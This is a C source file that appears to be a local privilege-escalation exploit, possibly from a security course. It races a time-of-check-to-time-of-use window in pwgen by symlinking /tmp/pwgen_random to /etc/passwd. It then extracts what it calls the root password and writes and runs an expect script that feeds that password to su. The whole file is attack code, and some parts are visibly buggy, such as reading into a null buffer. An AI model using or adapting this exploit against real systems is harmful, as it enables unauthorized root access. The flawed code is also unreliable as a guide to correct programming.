#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>

// This code exploits a toctou vulnerability within check_perms which creates a race window
//  where we can unlink the passwd file and link a new file that we can place a root enabled user in
int main(int argc, char *argv[]) {

    FILE * filepointer;
    struct stat ckst;
    int pid, i, end;
    char* word = NULL;
    char* secret =NULL;
    int counter = 0;
    char* line1 = "#!/usr/bin/expect";
    char* line2 = "spawn su";
    char* line3 = "expect \"Password:\"";
    char* line5 = "interact";
    char* secretcode;
    secretcode = malloc(1024);
    remove("/tmp/pwgen_random");

    end = EOF;

    // fork process to parent that checks if child has edited the file
    pid = fork();
    if (pid == 0){
        // begin pwgen with flag --seed
        system("pwgen --seed");
        waitpid(pid, NULL, 0);
    } else {
        printf("creating a child to symlink the passwd file\n");
        while (1) {
            if (counter == 10000) break;

            for(i = 0; i < 10000; i++); //wait a small amount of time

            if (symlink("/etc/passwd", "/tmp/pwgen_random") != 0){
                if (counter % 1000 == 0) printf("have not yet symlinked\n");
            }

            for(i = 0; i < 10000; i++); //wait for a small amount of time

            if (lstat("/tmp/pwgen_random", &ckst) == 0) {
                if (ckst.st_uid == 0) return 0;
            } 
            counter++;
        }
    }

    filepointer = fopen("/tmp/pwgen_random", "r");
    counter = 0;
    if (filepointer != NULL) {
        while (fscanf(filepointer, "%s", word) == 1) {
            counter++;
            if (counter == 5) {
                secret = word;
                break;
            }
        }
    } else {
        return 1;
    }
    if (secret != NULL) {
        fclose(filepointer);
        printf("the secret password is: %s\n", secret);
        printf("\n");
        sprintf(secretcode, "send %s\\n", secret);
        printf("\n");
        filepointer = fopen("/share/sploit4steal.sh", "w");
        fprintf(filepointer, "%s\n", line1);
        fprintf(filepointer, "%s\n", line2);
        fprintf(filepointer, "%s\n", line3);
        fprintf(filepointer, "%s\n", secretcode);
        fprintf(filepointer, "%s\n", line5);
        fclose(filepointer);
        system("chmod +x /share/sploit4steal.sh");
        execve("/share/sploit4steal.sh", NULL, NULL);
    } else {
        printf("failure to symlink exiting");
        system(end);
    }
    return 0;
}
